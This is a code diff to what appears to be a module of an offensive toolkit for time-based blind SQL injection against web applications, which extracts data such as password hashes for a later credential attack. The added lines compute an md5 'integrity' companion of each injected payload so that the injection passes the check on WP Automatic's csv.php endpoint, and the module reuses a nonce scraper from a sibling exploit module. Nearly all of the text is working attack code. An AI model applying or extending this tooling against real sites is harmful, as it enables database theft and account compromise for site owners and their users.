@@ -14,6 +14,7 @@ requests per character), so callers run it deliberately, never in a fast sweep.
 A recovered password *hash* is not a plaintext: it still needs offline cracking
 before it can feed the credential attack. This module does not pretend otherwise.
 """
+import hashlib
 import time
 
 from . import exploit as _exploit  # reuse the JS-nonce scraper
@@ -34,7 +35,18 @@ def _timed(base_url, http, recipe, cond, sleep):
     # $_GET['orderby'] while the ajax dispatch itself is POST) — 'inject_in' lets
     # a recipe say so explicitly.
     inject_in = recipe.get("inject_in") or ("data" if method == "POST" else "params")
-    (data if inject_in == "data" else params)[recipe["inject_param"]] = payload
+    bucket = data if inject_in == "data" else params
+    bucket[recipe["inject_param"]] = payload
+    # Some endpoints gate the injected param behind an integrity companion whose
+    # value is a hash of the injected value itself (WP Automatic csv.php requires
+    # integ == md5(q)). Compute it AFTER placing the payload and per request, since
+    # the injected query changes every call (cond/sleep vary) — a static value
+    # would only ever match one request. Rides in the same bucket as the payload.
+    integ = recipe.get("integrity")
+    if integ:
+        digest = hashlib.new(integ.get("algo", "md5"),
+                             bucket[recipe["inject_param"]].encode()).hexdigest()
+        bucket[integ["param"]] = digest
     t0 = time.monotonic()
     try:
         if method == "POST":
